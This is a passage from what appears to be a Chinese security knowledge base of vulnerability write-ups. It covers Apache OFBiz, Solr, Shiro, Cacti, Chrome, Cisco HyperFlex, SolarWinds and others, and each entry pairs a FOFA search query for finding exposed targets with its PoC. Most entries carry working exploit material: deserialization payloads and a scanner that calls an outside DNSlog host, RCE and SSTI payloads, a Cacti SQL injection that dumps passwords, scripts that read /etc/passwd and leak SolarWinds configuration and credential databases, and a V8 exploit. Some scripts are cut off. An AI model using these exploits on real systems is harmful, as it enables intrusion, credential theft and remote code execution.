aced00057372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00014c0004686f737471007e00014c000870726f746f636f6c71007e00014c000372656671007e00017870ffffffffffffffff7400177878787878782e3768693376322e646e736c6f672e636e74000071007e0003740004687474707078 poc.py: #coding:utf-8 import binascii import os import requests import urllib3 import uuid urllib3.disable_warnings() def main(): id = requests.get(\"https://dns.xn--9tr.com/new_gen\").text.split(\".\")[0] if(not os.path.exists(\"target.txt\")): exit(\"put url in target.txt! \") if(not os.path.exists(\"ysoserial.jar\")): exit(\"where is ysoserial.jar?\") with open(\"target.txt\")as f: urls = f.readlines() for url in urls: url = url.strip() uid = uuid.uuid1().hex cmd = \"java -jar .\\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk > tmp\".format(uid,id) r = os.popen(cmd) r.close() with open(\"tmp\",'rb') as f: payload = binascii.hexlify(f.read()) data = ''' {0} '''.format(payload.decode()) headers = { \"user-agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\" } url = url+\"/webtools/control/SOAPService\" try: requests.post(url,data=data,verify=False,headers=headers,timeout=5) requests.post(url,data=data,verify=False,headers=headers,timeout=5) requests.post(url,data=data,verify=False,headers=headers,timeout=5) except: pass dnslogresurl = \"https://dns.xn--9tr.com/\"+id if(uid in requests.get(dnslogresurl).text): print(\"[+] {0} 漏洞存在\".format(url)) else: print(\"[-] {0} 漏洞不存在\".format(url)) print(\"[+] 请到 {0} 查看结果\".format(dnslogresurl)) if __name__ == \"__main__\": main() ref: https://issues.apache.org/jira/projects/OFBIZ/issues/OFBIZ-12167?filter=doneissues https://www.o2oxy.cn/3271.html https://github.com/yumusb/CVE-2021-26295-POC https://forum.ywhack.com/thread-115305-1-7.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache OFBiz 反序列化（CVE-2021-30128）.html":{"url":"Edge_Security/Apache OFBiz 反序列化（CVE-2021-30128）.html","title":"Apache OFBiz 反序列化（CVE-2021-30128）","keywords":"","body":"Apache OFBiz 反序列化（CVE-2021-30128） 影响版本 Apache OFBiz FOFA： app=\"Apache_OFBiz\" 阿里云分析：https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w r0cky：https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A PoC： POST /webtools/control/SOAPService HTTP/1.1 Host: 192.168.80.145:8443 User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: text/xml Content-Length: 6093 ACED0005 ... ... 871007E000D78 EXP.py: #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" @Author: r0cky @Time: 2021/3/24-15:09 \"\"\" import subprocess import sys import requests import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def banner(): print(\"\"\" =================================================== ____ ______ ____ _ ________ _______ / __ \\| ____| _ \\(_) | ____\\ \\ / / __ \\ | | | | |__ | |_) |_ ____ | |__ \\ V /| |__) | | | | | __| | _ {} \"\"\".format(post_data) print(\"[+] payload sending...\") r = requests.post(url, data=data, headers=headers, verify=False) if r.status_code == 200: print(\"[+] send payload success.\") print() print(\"[END] Apache OFBiz RCE Done.\") else: print(\"[-] send payload failed.\") print() print(\"[END] Apache OFBiz RCE failed.\") headers={\"Content-Type\": \"text/xml\"} if __name__ == '__main__': banner() try: target = sys.argv[1] cmd = sys.argv[2] # target = \"https://192.168.80.136:8443\" # vps_ip = \"10.20.28.16\" # vps_port = \"9999\" url = \"{}/webtools/control/SOAPService\".format(target) exp(url, cmd) except: print(\"Example: \\n\\tpython3 \" + sys.argv[0] + \" \\n\") ref: https://github.com/r0ckysec/CVE-2021-30128 https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache OfBiz 服务器端模板注入（SSTI）.html":{"url":"Edge_Security/Apache OfBiz 服务器端模板注入（SSTI）.html","title":"Apache OfBiz 服务器端模板注入（SSTI）","keywords":"","body":"Apache OfBiz 服务器端模板注入（SSTI） Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。 FOFA： app=\"Apache_OFBiz\" 服务器端模板注入 renderLookupField 从不可信数据流request.getParameter(\"_LAST_VIEW_NAME_\")给一个FreeMarker的宏调用定义。具有特权以渲染任何包含查找字段的页面的攻击者将能够通过发送有效载荷来执行任意系统命令。 PoC： https://localhost:8443/ordermgr/control/FindQuote?_LAST_VIEW_NAME_=%22%2F%3E%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%3CFOO from:https://securitylab.github.com/advisories/GHSL-2020-067-apache_ofbiz Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache OfBiz 远程代码执行（RCE）.html":{"url":"Edge_Security/Apache OfBiz 远程代码执行（RCE）.html","title":"Apache OfBiz 远程代码执行（RCE）","keywords":"","body":"Apache OfBiz 远程代码执行（RCE） Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。 FOFA： app=\"Apache_OFBiz\" PoC: https://localhost/ordermgr/control/FindRequest?foo=bar\"ajaxEnabled=false/>${\"freemarker.template.utility.Execute\"?new()(\"id\")}from:https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Shiro < 1.7.1 权限绕过漏洞（CVE-2020-17523）.html":{"url":"Edge_Security/Apache Shiro < 1.7.1 权限绕过漏洞（CVE-2020-17523）.html","title":"Apache Shiro < 1.7.1 权限绕过漏洞（CVE-2020-17523）","keywords":"","body":"Apache Shiro Apache Shiro是一个应用广泛的权限管理的用户认证与授权框架。2021年2月1日，Apache Shiro发布1.7.1版本，修复了 Apache Shiro 身份验证绕过漏洞 (CVE-2020-17523)。攻击者可以使用包含payload的恶意请求绕过Shiro的身份认证。漏洞利用需要配合Spring环境. 影响版本 Apache Shiro 详细分析可见：https://www.anquanke.com/post/id/230935 PoC： http://127.0.0.1:8080/admin/%20 使用空格等空字符，可绕过shiro身份验证。 ref： https://help.aliyun.com/noticelist/articleid/1060799995.html https://www.anquanke.com/post/id/230935 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Solr Replication handler SSRF（CVE-2021-27905）.html":{"url":"Edge_Security/Apache Solr Replication handler SSRF（CVE-2021-27905）.html","title":"Apache Solr Replication handler SSRF（CVE-2021-27905）","keywords":"","body":"Apache Solr Replication handler SSRF（CVE-2021-27905） Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。 影响版本： Apache Solr 7.0.0 - 7.7.3 Apache Solr 8.0.0 - 8.8.1 poc： GET /solr/test/replication?command=fetchindex&masterUrl=http://127.0.0.1/&wt=json&httpBasicAuthUser=&httpBasicAuthPassword= HTTP/1.1 HOST:target .... GET http://xxxxx/solr/xxxx/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1 HOST:target ... ref： https://nox.qianxin.com/vulnerability/detail/92900 https://nvd.nist.gov/vuln/detail/CVE-2021-27905 https://forum.ywhack.com/thread-115470-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Solr stream.url任意文件读取漏洞.html":{"url":"Edge_Security/Apache Solr stream.url任意文件读取漏洞.html","title":"Apache Solr stream.url任意文件读取漏洞","keywords":"","body":"Apache Solr stream.url任意文件读取漏洞 Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。 FOFA: title=\"Solr Admin\" 可以参考Skay的文章：https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 注意得选择正确的core 影响版本： Apache Solr 访问 Solr Admin 管理员页面，获取core信息 http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json 文件读取： POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Poc.py: #!/usr/bin/python # coding: UTF-8 import requests host=\"http://192.168.1.79:8081/\" if host[-1]=='/': host=host[:-1] def get_core(host): url=host+'/solr/admin/cores?indexInfo=false&wt=json' core_data=requests.get(url,timeout=3).json() if core_data['status']: core=core_data['status'].keys()[0] jsonp_data={\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":'true'}} requests.post(url=host+\"/solr/%s/config\"%core,json=jsonp_data) result_data=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams'%core,data={\"stream.url\":\"file:///etc/passwd\"}).json() if result_data['streams']: print result_data['streams'][0]['stream'] else: exit(\"不存在此漏洞\") get_core(host) ref： https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA https://www.o2oxy.cn/3227.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/arpping 2.0.0 远程代码执行（RCE）.html":{"url":"Edge_Security/arpping 2.0.0 远程代码执行（RCE）.html","title":"arpping 2.0.0 远程代码执行（RCE）","keywords":"","body":"arpping 2.0.0 远程代码执行（RCE） arpping是一个软件包，使用ping和arp查找并搜索与Internet连接的设备（本地）。 npm页面： https://www.npmjs.com/package/arpping PoC： 创建一个index.js const Arpping = require('arpping'); var arpping = new Arpping(); arpping.ping([\"127.0.0.1;touch HACKED;\"]); // arpping.arp([\"127.0.0.1; touch HACKED;\"]); ref： https://hackerone.com/reports/972220 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/BloofoxCMS 0.5.2.1 存储型XSS.html":{"url":"Edge_Security/BloofoxCMS 0.5.2.1 存储型XSS.html","title":"BloofoxCMS 0.5.2.1 存储型XSS","keywords":"","body":"BloofoxCMS 0.5.2.1 存储型XSS 漏洞文件： /admin/include/inc_content_articles.php FOFA: app=\"BloofoxCMS\" 受影响版本： 0.5.1.0 -.5.2.1 PoC: 登录有效的账号，在添加文章的时候插入Payload发布，每次访问均可触发： ref： https://packetstormsecurity.com/files/161195 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Bypass for Microsoft Exchange远程代码执行 CVE-2020-16875.html":{"url":"Edge_Security/Bypass for Microsoft Exchange远程代码执行 CVE-2020-16875.html","title":"Bypass for Microsoft Exchange远程代码执行 CVE-2020-16875","keywords":"","body":"Bypass for Microsoft Exchange远程代码执行 CVE-2020-16875 CVE-2020-16875的补丁代码： internal static void ValidateCmdletParameters(string cmdlet, IEnumerable> requiredParameters) { if (string.IsNullOrWhiteSpace(cmdlet)) { return; } Collection collection2; Collection collection = PSParser.Tokenize(cmdlet, out collection2); if (collection2 != null && collection2.Count > 0) { throw new DlpPolicyParsingException( Strings.DlpPolicyNotSupportedCmdlet(cmdlet)); } if (collection != null) { // #1 CHECKS IF THERE IS MORE THAN ONE COMMAND, BUT DOES NOT // RECOGNIZE .NET FUNCTIONS SUCH AS [Int32]::Parse(\"12\") if ((from token in collection where token.Type == PSTokenType.Command select token).ToList().Count > 1) { throw new DlpPolicyParsingException( Strings.DlpPolicyMultipleCommandsNotSupported(cmdlet)); } } bool flag = false; foreach (KeyValuePair keyValuePair in requiredParameters) { // #2 CHECKS IF THE cmdlet STRING(!!) STARTS WITH AN ALLOWED KEY if (cmdlet.StartsWith(keyValuePair.Key, StringComparison.InvariantCultureIgnoreCase)) { // #3 CHECKS IF THE THE VALUES / PARAMETERS MATCH A CERTAIN // REGEX if (!Regex.IsMatch(cmdlet, keyValuePair.Value, RegexOptions.IgnoreCase)) { throw new DlpPolicyParsingException( Strings.DlpPolicyMissingRequiredParameter(cmdlet, keyValuePair.Value)); } flag = true; } } if (!flag) { throw new DlpPolicyParsingException(Strings.DlpPolicyNotSupportedCmdlet( cmdlet)); } } 绕过： 可以轻松绕过检查＃2，因为检查是在原始cmdlet字符串，仅使用函数.StartsWith()检查cmdlet的开头。要绕过，我们只提供给定的有效键中包含的命令字符串通过requiredParameters： new-transportruleSOMETHINGELSE .... PoC： 以下Payload可以绕过所有三个检查： \")) -DlpPolicy \"%%DlpPolicyName%%\" ]]> 详情可以阅读：https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/ https://forum.ywhack.com/thread-114854-1-2.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/C-Lodop打印机任意文件读取漏洞.html":{"url":"Edge_Security/C-Lodop打印机任意文件读取漏洞.html","title":"C-Lodop打印机任意文件读取漏洞","keywords":"","body":"C-Lodop打印机任意文件读取漏洞 C-Lodop打印机存在任意文件读取漏洞，通过构造特殊URL，可实现读取系统任意文件。 fofa：title=\"C-Lodop\" poc： GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1 Host: 127.0.0.1 .... Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Cacti SQL 注入漏洞（CVE-2020-14295）.html":{"url":"Edge_Security/Cacti SQL 注入漏洞（CVE-2020-14295）.html","title":"Cacti SQL 注入漏洞（CVE-2020-14295）","keywords":"","body":"Cacti SQL 注入漏洞（CVE-2020-14295） Cacti 1.2.12 中 color.php 中存在 SQL注入漏洞，允许具有管理员权限的攻击者通过 filter 参数注入 SQL。因为产品接受堆积的查询，所以这可能导致远程命令执行。目前该漏洞 EXP 已公开。 影响版本： Cacti 详情可以参考：https://github.com/Cacti/cacti/issues/3622 PoC： /cacti/color.php?action=export&header=false&filter=')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+user_auth+set+username='sqli'+where+id=3;--+- Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Chrome 插件 Vue.js devtools UXSS.html":{"url":"Edge_Security/Chrome 插件 Vue.js devtools UXSS.html","title":"Chrome 插件 Vue.js devtools UXSS","keywords":"","body":"Chrome 插件 Vue.js devtools UXSS 在中devtools-background.js，toast函数中存在代码注入。它可以由任何选项卡中的postMessage触发，从而在打开浏览器的开发人员工具（F12）时产生通用XSS。攻击者可以托管一个特制网页来利用此漏洞，然后诱使用户查看该网页并在其他Chrome标签中打开开发人员工具（F12）。 条件有点苛薄...需要安装特定版本插件，然后访问指定PoC网页 最后打开开发者工具(F12)进行触发.. 受影响版本： Vue.js devtools 5.3.3 Vue.js devtools 6.0.0 beta3 详细分析见：https://github.com/vuejs/vue-devtools/issues/1353 chrome插件：https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd PoC1: setInterval(() => { window.postMessage({ vueDetected: true, vueToast: { message: '`,`normal`); function __VUE_DEVTOOLS_TOAST__(){}; alert(document.domain);//' } }, '*') }, 1000) POC2: const urls = ['https://www.google.com/', 'https://github.com', 'https://vuejs.org/'] var i = 0; setInterval(() => { window.postMessage({ vueDetected: true, vueToast: { message: '`,`normal`); function __VUE_DEVTOOLS_TOAST__(){}; alert(document.domain); location=`' + urls[i++%3] +'`//' } }, '*') }, 3000) ref： https://github.com/vuejs/vue-devtools/issues/1353 https://forum.ywhack.com/thread-115069-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Chrome 远程代码执行漏洞 1Day（CVE-2021-21220）.html":{"url":"Edge_Security/Chrome 远程代码执行漏洞 1Day（CVE-2021-21220）.html","title":"Chrome 远程代码执行漏洞 1Day（CVE-2021-21220）","keywords":"","body":"Chrome 远程代码执行漏洞 1Day（CVE-2021-21220） 国外安全研究员在Github放出了Windows Chrome的exploit利用代码 影响基于Chromium内核的所有浏览器 实际上该漏洞属于1day，已在最新版本的chrome v8中修复，但仍适用于Chrome正式版（ 89.0.4389.114）。 影响版本： Google Chrome exploit见：https://github.com/r4j0x00/exploits/tree/master/chrome-0day 情报参考：https://forum.ywhack.com/thread-115463-1-1.html exploit.js： var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) > 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i ref： https://twitter.com/r4j0x00/status/1381644845316378630 https://github.com/v8/v8/commit/fd29e246f65a7cee130e72cd10f618f3b82af232 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Cisco HyperFlex HX 任意文件上传（CVE-2021-1499）.html":{"url":"Edge_Security/Cisco HyperFlex HX 任意文件上传（CVE-2021-1499）.html","title":"Cisco HyperFlex HX 任意文件上传（CVE-2021-1499）","keywords":"","body":"Cisco HyperFlex HX 任意文件上传（CVE-2021-1499） Cisco HyperFlex HX数据平台基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者将文件上传到受影响的设备。 wvu@kharak:~$ curl -v http://192.168.123.133/upload -F x=@/dev/null * Trying 192.168.123.133... * TCP_NODELAY set * Connected to 192.168.123.133 (192.168.123.133) port 80 (#0) > POST /upload HTTP/1.1 > Host: 192.168.123.133 > User-Agent: curl/7.64.1 > Accept: */* > Transfer-Encoding: chunked > Content-Type: multipart/form-data; boundary=------------------------1b9a7fe625152b78 > Expect: 100-continue > ref: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-upload-KtCK8Ugz https://attackerkb.com/topics/Z2MeUsvSlT/cve-2021-1499 https://nvd.nist.gov/vuln/detail/CVE-2021-1499 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Cisco HyperFlex HX 命令注入（CVE-2021-1497-CVE-2021-1498）.html":{"url":"Edge_Security/Cisco HyperFlex HX 命令注入（CVE-2021-1497-CVE-2021-1498）.html","title":"Cisco HyperFlex HX 命令注入（CVE-2021-1497-CVE-2021-1498）","keywords":"","body":"Cisco HyperFlex HX 命令注入（CVE-2021-1497/CVE-2021-1498） Cisco HyperFlex HX的基于Web的管理界面中的多个漏洞可能允许未经身份验证的远程攻击者对受影响的设备执行命令注入攻击。 wvu@kharak:~$ curl -v http://192.168.123.133/storfs-asup -d 'action=&token=`id`&mode=`id`' * Trying 192.168.123.133... * TCP_NODELAY set * Connected to 192.168.123.133 (192.168.123.133) port 80 (#0) > POST /storfs-asup HTTP/1.1 > Host: 192.168.123.133 > User-Agent: curl/7.64.1 > Accept: */* > Content-Length: 28 > Content-Type: application/x-www-form-urlencoded > * upload completely sent off: 28 out of 28 bytes ref： https://attackerkb.com/topics/mDqlWhQovO/cve-2021-1497?referrer=home https://nvd.nist.gov/vuln/detail/CVE-2021-1497 https://nvd.nist.gov/vuln/detail/CVE-2021-1498 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CloudBees Jenkins和LTS 跨站脚本漏洞 CVE-2020-2229.html":{"url":"Edge_Security/CloudBees Jenkins和LTS 跨站脚本漏洞 CVE-2020-2229.html","title":"CloudBees Jenkins和LTS 跨站脚本漏洞 CVE-2020-2229","keywords":"","body":"CloudBees Jenkins和LTS 跨站脚本漏洞 CVE-2020-2229 CloudBees Jenkins（Hudson Labs）是美国CloudBees公司的一套基于Java开发的持续集成工具。该产品主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。LTS是CloudBeesJenkins的一个长期支持版本。 CloudBees Jenkins 2.251及之前版本和LTS 2.235.3及之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 Exploit: # Exploit Title: Jenkins 2.235.3 - 'tooltip' Stored Cross-Site Scripting # Date: 11/12/2020 # Exploit Author: gx1 # Vendor Homepage: https://www.jenkins.io/ # Software Link: https://updates.jenkins-ci.org/download/war/ # Version: svgIcon is a layout element belonging to jenkins core: https://reports.jenkins.io/core-taglib/jelly-taglib-ref.html#layout:svgIcon As suggested by Jenkins documentation (https://www.jenkins.io/doc/developer/security/xss-prevention/) \"Note that this only affects the use of ${...} among PCDATA, and not in attribute values, so that Jelly tag invocations don’t result in surprising behavior.\" Tooltip attribute can contain HTML code, as suggested in form section: https://www.jenkins.io/doc/developer/forms/adding-tool-tips/ For this reason, it is possible to inject XSS code in a Jenkins system by uploading a plugin that contains an element containing a malicious XSS payload in tooltip attribute: \">... To build a Jenkins plugin, visit https://www.jenkins.io/doc/developer/tutorial/create/ . To obtain information about Jelly syntax, visit https://wiki.jenkins.io/display/JENKINS/Basic+guide+to+Jelly+usage+in+Jenkins Proof Of Concept: 1. Obtain access to upload Jenkins plugins, or find plugins that can insert svgIcon element. 2. Generate a plugin. For example, you can create a class that implements ModelObjectWithContextMenu interface to create a context menu and implement the method getUrlName() containing a string that you can navigate by using the link: http(s):/// 3. In jelly file, insert the following element: \"> This creates an icon that triggers the Cross-Site Scripting when the mouse is over and opens tooltip. Obviously, you can use css and large size and height to generate a svg element that covers all the screen in order to trigger the XSS when the user navigates the page. Solution: The following releases contain fixes for security vulnerabilities: * Jenkins 2.252 * Jenkins LTS 2.235.4 ref: https://www.anquanke.com/vul/id/2119266 https://www.exploit-db.com/exploits/49232 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CNVD-2020-24741 JunAms内容管理系统文件上传漏洞.html":{"url":"Edge_Security/CNVD-2020-24741 JunAms内容管理系统文件上传漏洞.html","title":"CNVD-2020-24741 JunAms内容管理系统文件上传漏洞","keywords":"","body":"CNVD-2020-24741 JunAms内容管理系统文件上传漏洞 JunAMS是一款以ThinkPHP为框架的开源内容管理系统。 JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。 影响版本：JunAMS junAMS 1.2.1.20190403 EXPLOIT: via：beautymanor ref： https://www.cnvd.org.cn/flaw/show/CNVD-2020-24741 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CNVD-C-2020-121325 禅道开源版文件上传漏洞.html":{"url":"Edge_Security/CNVD-C-2020-121325 禅道开源版文件上传漏洞.html","title":"CNVD-C-2020-121325 禅道开源版文件上传漏洞","keywords":"","body":"CNVD-C-2020-121325 禅道开源版文件上传漏洞 禅道官网发布了12.4.3版本更新公告，修复了一个文件上传的漏洞。恶意攻击者（需要登陆后台的任意⽤用户）可以通过fopen/fread/fwrite方法结合file、http、ftp等协议，读取或上传任意敏感文件，成功利用漏洞可获得目标系统中敏感文件及系统管理权限。 漏洞编号： CNVD-C-2020-121325 漏洞等级：高危 受影响的版本： 禅道开源版 通过版本比对，问题出在module/client/ext/model/xuanxuan.php:14 的 downloadZipPackage 函数中： 没有对后缀名进行限制，补丁则进行了白名单处理 所以getshell 的一个方法之一就是直接远程download一个php文件即可shell。 ref： https://mp.weixin.qq.com/s/d-dtcUi2yLKsyXfPuyUF8A https://www.zentao.net/dynamic/zentaopms12.4.3-80272.html https://s.tencent.com/research/bsafe/1159.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Coremail论客邮件系统路径遍历与文件上传漏洞.html":{"url":"Edge_Security/Coremail论客邮件系统路径遍历与文件上传漏洞.html","title":"Coremail论客邮件系统路径遍历与文件上传漏洞","keywords":"","body":"Coremail论客邮件系统路径遍历与文件上传漏洞 监测到Coremail论客邮件系统存在路径遍历与文件上传漏洞，攻击者可利用/lunkr/cache/;/;/../../manager/html 设置参数X-Forwarded-For: 127.0.0.1.Coremail 的 nginx 配置文件中，未针对/lunkr/cache 路径向上解析的时候做 X-Forwarded-For 字段的限制，从而可以利用该接口实现配合利用 nginx 不解析，但 tomcat 解析的差异特性，实现绕过 tomcat manager 的本地 ip 限制。 情报见：https://forum.ywhack.com/viewthread.php?tid=115403 通过/lunkr/cache/;/;/../../manager/html进入Tomcat控制台，部署war包进行getshell。 https://forum.ywhack.com/thread-115484-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-10148 SolarWinds Orion API 远程代码执行漏洞.html":{"url":"Edge_Security/CVE-2020-10148 SolarWinds Orion API 远程代码执行漏洞.html","title":"CVE-2020-10148 SolarWinds Orion API 远程代码执行漏洞","keywords":"","body":"CVE-2020-10148 SolarWinds Orion API 远程代码执行漏洞 SolarWinds Inc. 是一家美国公司，为企业提软件以帮助管理其网络，系统和信息技术基础架构。攻击者通过构造恶意URI，可以绕过API身份验证，从而利用API功能造成远程代码执行漏洞。 影响版本 SolarWinds Orion 2020.2.1 HF 2 及 2019.4 HF 6之前的版本 SolarWinds.Orion.Web.HttpModules 在 OnRequest 中 构造的path如果含有比如 Skipi18n，以css/js结尾等 ，则会直接context.SkipAuthorization = true 跳过了认证 FOFA： app=\"SolarWinds-Network-Performance-Monitor\" CVE-2020-10148-poc.py: # CVE-2020-10148 (local file disclosure PoC for SolarWinds Orion aka door to SuperNova ? ) # @0xSha # (C) 2020 0xSha.io # Advisory : https://www.solarwinds.com/securityadvisory # Mitigation : https://downloads.solarwinds.com/solarwinds/Support/SupernovaMitigation.zip # Details : https://kb.cert.org/vuls/id/843464 # C:\\inetpub\\SolarWinds\\bin\\OrionWeb.DLL # According to SolarWinds.Orion.Web.HttpModules # in case of special strings this will set auth to null user and if case of ending with .i18n.ashx it will read the files ''' private static void OnRequest(object sender, EventArgs e) { HttpApplication httpApplication = (HttpApplication)sender; HttpContext context = httpApplication.Context; string path = context.Request.Path; if (path.IndexOf(\"Skipi18n\", StringComparison.OrdinalIgnoreCase) >= 0) { if (context.User == null || !context.User.Identity.IsAuthenticated) { context.SkipAuthorization = true; context.User = new NullUser(); } return; } if (path.EndsWith(\".css\", StringComparison.OrdinalIgnoreCase) || path.EndsWith(\".js\", StringComparison.OrdinalIgnoreCase)) { if (context.User == null || !context.User.Identity.IsAuthenticated) { context.SkipAuthorization = true; context.User = new NullUser(); } LocalizerHttpHandler.RedirectToMe(context, context.Request.Path); return; } if (!path.EndsWith(\".i18n.ashx\")) { return; } string revisedFile = path.Substring(0, path.Length - \".i18n.ashx\".Length); string path2 = i18nRedirector.RebuildPath(context.Request.QueryString, revisedFile); context.RewritePath(path2); } private static string RebuildPath(NameValueCollection nvc, string revisedFile) { return \"/Orion/i18n.ashx?file=\" + revisedFile + \"&\" + string.Join(\"&\", (from x in nvc.AllKeys where x != \"file\" select x into key select string.Format(\"{0}={1}\", HttpUtility.UrlEncode(key), HttpUtility.UrlEncode(nvc[key]))).ToArray()); } ''' #/usr/local/bin/python3 import requests import sys if len(sys.argv) 1 : print(\"[+] Target is vulnerable Got the web.config file \") outputFile = target.replace(\"https://\",\"\").replace(\"http://\",\"\")+\"_web.config\" configFile = open(outputFile,\"w\") configFile.write(leakedConfig.text) configFile.close() print(\"[+] web.config written to : \" + outputFile ) else: print(\"[-] Failed to download web.config target is not vulnerable\") exit(-1) print(\"[*] Trying to leak SWNetPerfMon.db file (works only on older versions of orion) \") # https://support.solarwinds.com/SuccessCenter/s/article/Passwords-that-Orion-stores-locally-on-the-server?language=en_US # C:\\inetpub\\SolarWinds\\SWNetPerfMon.db # C:\\Program Files (x86)\\SolarWinds\\Orion\\SWNetPerfMon.db leakedDB = requests.get(target+\"/SWNetPerfMon.db\"+leakedVersion, verify=False) if (leakedDB.status_code == 200) and len(leakedDB.text) > 1: print(\"[+] Target is vulnerable Got the SWNetPerfMon.db file \") outputFile = 